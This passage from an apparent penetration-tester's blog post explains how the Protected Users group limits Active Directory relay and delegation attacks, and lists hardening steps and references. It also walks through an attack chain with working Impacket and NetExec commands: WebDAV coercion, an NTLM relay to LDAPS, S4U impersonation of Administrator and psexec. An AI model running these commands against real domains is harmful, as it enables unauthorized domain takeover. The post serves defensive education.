| Blocked by MAQ = 0 | Only if no SPN account exists | No | No |
| Requires schema 2016+ and PKINIT-capable DC | No | No | Yes |
| Complexity | Lower | Higher | Medium |
| Fallback for | Default environments | MAQ=0, no SPN available | MAQ=0, schema 2016+ with PKINIT |

---

## Part 5 — Protected Users: the kill switch for a lot of this

### What the group actually does

<span style="color:#ff0000">Protected Users</span> is a special security group introduced in Windows Server 2012 R2 that applies a hardened set of restrictions to any account placed inside it. Unlike a Group Policy setting, membership in this group enforces protections at the **KDC and domain controller level**, meaning they apply regardless of which machine the user authenticates from.

The protections are:

- **NTLM authentication is fully blocked.** Members cannot authenticate using NTLM at all. The DC will refuse the exchange outright.
- **Kerberos pre-authentication is restricted to AES only.** DES and RC4 encryption types are disabled, which significantly raises the cost of offline cracking if a ticket is captured.
- **Delegation is blocked entirely.** Members cannot be configured for constrained, unconstrained, or resource-based constrained delegation. This is enforced by the DC, not just by a flag on the account object.
- **TGT lifetime is reduced to 4 hours** and cannot be renewed beyond that window without the user re-authenticating interactively. The default TGT lifetime in AD is 10 hours with 7-day renewal.
- **Credentials are not cached on endpoints.** DPAPI-protected credential secrets and cached logon hashes are not stored for Protected Users members, which eliminates a whole class of offline credential extraction from endpoints.

These protections should be applied to all privileged accounts as a baseline, and particularly to Domain Admins and Enterprise Admins. Microsoft recommends putting any account in Protected Users whose compromise would hurt at the domain level.

### Mapping each protection back to the earlier attacks

| Protection | Attack it stops |
|---|---|
| NTLM blocked | NTLM relay, Pass-the-Hash, future NTLMv2 captures (hashes already captured before group membership remain crackable) |
| Delegation blocked | RBCD impersonation, constrained and unconstrained delegation abuse |
| AES-only Kerberos | Makes Kerberoasting significantly harder (no RC4 cracking) |
| TGT lifetime 4 hours | Reduces the window for Pass-the-Ticket attacks |
| No credential caching | Eliminates cached credential extraction from endpoints |

This is why, as noted in Part 4, trying to impersonate a <span style="color:#ff0000">Protected Users</span> member via <span style="color:#ff0000">RBCD</span> will fail at the KDC level. The DC simply will not issue a delegation ticket for that account regardless of what is written in `msDS-AllowedToActOnBehalfOfOtherIdentity`.

### What Protected Users does NOT do

Protected Users is not a complete shield. These are the things it does not stop:

- **It does not protect against password attacks.** Brute force, password spraying, and credential stuffing are completely unaffected by group membership.
- **It does not prevent Pass-the-Ticket if the TGT is already stolen.** Within the 4-hour window, a stolen TGT is still valid. The reduced lifetime shrinks the exposure window but does not eliminate it.
- **It does not protect against DCSync.** If an account has replication privileges on the domain, those privileges are not removed by group membership.
- **It does not protect against Golden Ticket attacks.** If the KRBTGT hash is compromised, forged tickets bypass Protected Users restrictions entirely.
- **It should not be applied blindly to service accounts.** Many services rely on NTLM, RC4 Kerberos, or delegation to function. Adding a service account to Protected Users without testing will break those services in production.

---

## Full attack chain: from low-priv user toward Domain Admin

Before the full chain can execute, a specific set of conditions must be true in the target environment. If any one of these is missing, the chain breaks at that point.

1. **LDAP channel binding is disabled on the DC**, otherwise the relay to LDAPS is blocked by the CBT mismatch
2. **The WebClient service is running on the target workstation**, required for WebDAV coercion to work
3. **RBCD can be applied to the target computer**, meaning the default Write Account Restrictions ACE for NT AUTHORITY\SELF must be intact, allowing the computer account to write `msDS-AllowedToActOnBehalfOfOtherIdentity` on its own object, which is the default in AD. This can be blocked if an administrator has explicitly hardened the computer object's DACL to remove that write permission, or if an explicit Deny ACE overrides it. Tier-0 assets and computers in hardened OUs are the most likely candidates for this kind of protection
4. **NTLMv2 is not disabled by policy**, since the coercion produces NTLMv2 and the relay relies on NTLM being available
5. **At least one coercion primitive works**, meaning Print Spooler, EFS RPC, DFS, or another must be reachable and not patched out
6. **A usable account exists for the delegation step**, either because MachineAccountQuota is greater than zero, a Kerberoastable SPN account exists, or an account is available to sacrifice for the SPN-less variant
7. **A target DA account exists that is enabled, not in Protected Users, and has `AccountNotDelegated` set to false**, because without this the impersonation step will fail at the KDC
8. **After takeover, lateral movement or credential dumping is possible**, since the final goal is Domain Admin, which may require moving from the compromised workstation to the DC or dumping credentials from LSASS. Any other machine with WebDAV enabled can be targeted through the same chain.

The following diagram connects every concept from this post into a single end-to-end view of the attack path we walked through. It covers the **classic RBCD variant** where MachineAccountQuota is greater than zero and a machine account (FAKE$) is created to hold the SPN. The SPN-less and Shadow Credentials variants follow the same coercion and relay steps but diverge at the delegation phase, as covered in Part 4.

<img src="/images/diagrams/attack_chain.png" alt="Full Attack Chain" style="display:block; margin:1.5rem auto; width:90%; border-radius:4px;" />

**1. Scan for WebClient**
```bash
WebclientServiceScanner
```

**2. Coerce via WebDAV**
```bash
nxc smb <target> -u <user> -p <pass> -M coerce_plus -o LISTENER=<attacker_hostname>@80/share/file.txt
```

**3. Relay to LDAPS**
```bash
ntlmrelayx.py -t ldaps://<DC_IP> --delegate-access --escalate-user 'FAKE$' --no-smb-server
```

**4. S4U2Self + S4U2Proxy**
```bash
getST.py -spn cifs/TARGET.corp.local -impersonate Administrator -k -no-pass -dc-ip <DC_IP> corp.local/'FAKE$':'Str0ngP4ss!'
```

**5. Authenticate**
```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass TARGET.corp.local
```

---

## The defenses that actually matter

Every step of the attack chain we walked through is stopped by a specific control. None of them are exotic or expensive, but they need to be applied together because each one only covers part of the attack surface.

**Disable the Print Spooler service on Domain Controllers and servers that do not need it.** The PrinterBug is one of the most reliable coercion primitives and it requires Print Spooler to be running. Microsoft has issued explicit guidance to disable it on DCs. There is no reason for a DC to be a print server.

**Disable or restrict the other coercion-capable RPC interfaces.** PetitPotam (MS-EFSRPC), DFSCoerce (MS-DFSNM), and ShadowCoerce (MS-FSRVP) should be audited in every environment. Where the underlying service is not operationally required, it should be disabled.

**Enforce LDAP signing on Domain Controllers.** This kills plain LDAP relay from any coercion path, including WebDAV. Without it, anyone who can coerce a machine via WebDAV and relay to port 389 has an open door into your directory.

**Enforce LDAP channel binding on Domain Controllers.** This kills LDAPS relay by tying the authentication to the TLS session. LDAP signing alone leaves LDAPS exposed. Both controls must be enabled together to close all relay paths.

**Enforce SMB signing on all machines, not just Domain Controllers.** The default leaves workstations and member servers without required signing. An attacker relaying NTLM to any of those machines over SMB will succeed at the session layer and can act on behalf of the victim account.

**Disable the WebClient service on servers and Domain Controllers.** On workstations it is installed by default and difficult to fully eliminate, but on servers it should not exist. Its presence on a DC combined with disabled channel binding is enough to make DC self-relay possible.

**Set MachineAccountQuota to 0.** Removing the ability for standard users to create machine accounts forces attackers to rely on Kerberoastable accounts or the SPN-less technique for <span style="color:#ff0000">RBCD</span>, both of which are harder paths.

**Place all privileged accounts in the <span style="color:#ff0000">Protected Users</span> group.** This blocks NTLM authentication entirely for those accounts, kills delegation-based impersonation, removes credential caching from endpoints, and reduces the TGT lifetime to four hours. It does not protect against everything, but it eliminates the most impactful relay and delegation attacks in a single step. (The built-in Administrator account should ideally be disabled and replaced with a named privileged account, as it is a default target in every impersonation attempt for a reason.)

**Audit accounts with SPNs and review delegation configurations regularly.** Unconstrained delegation should not exist on any machine other than DCs. RBCD attributes should be reviewed for unexpected entries. Kerberoastable service accounts with weak passwords are a persistent risk even in otherwise hardened environments.

---

Some of this might read as obvious or simple, but putting it together in a real environment is something else. Most of what is in this post came from things breaking, spending hours on something that turned out to be one missing flag, or realizing I had completely misunderstood something I thought I knew. After spending time across engagements, CTFs, labs, machines and my own personal lab, studying topics and not understanding them at first, the good part is that at some point it clicks. It just takes time.

---

## References & further reading

**Specs and RFCs:**

- [MS-NLMP: NT LAN Manager Authentication Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b38c36ed-2804-4868-a9ff-8dd3182128e4)
- [MS-KILE: Kerberos Protocol Extensions](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9)
- [MS-SFU: Kerberos Protocol Extensions, Service for User and Constrained Delegation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94)
- [RFC 4120, The Kerberos Network Authentication Service (V5)](https://www.rfc-editor.org/rfc/rfc4120)
- [RFC 5056, On the Use of Channel Bindings to Secure Channels](https://www.rfc-editor.org/rfc/rfc5056)
- [RFC 5929, Channel Bindings for TLS](https://www.rfc-editor.org/rfc/rfc5929)

**Microsoft documentation:**

- [Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [SMB Signing Required by Default in Windows — Ned Pyle](https://techcommunity.microsoft.com/blog/filecab/smb-signing-required-by-default-in-windows-insider/3831704)

**Practical guides:**

- [Resource-Based Constrained Delegation — The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
- [Exploiting RBCD Using a Normal User Account — James Forshaw](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [PrinterBug to Domain Administrator — Dionach](https://www.dionach.com/printer-server-bug-to-domain-administrator/)

**Tools:**

- [PetitPotam — topotam](https://github.com/topotam/PetitPotam)
- [DFSCoerce — Filip Dragović](https://github.com/Wh04m1001/DFSCoerce)
- [WebclientServiceScanner — Hackndo](https://github.com/Hackndo/WebclientServiceScanner)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Impacket](https://github.com/fortra/impacket)
- [PKINITtools — dirkjanm](https://github.com/dirkjanm/PKINITtools)
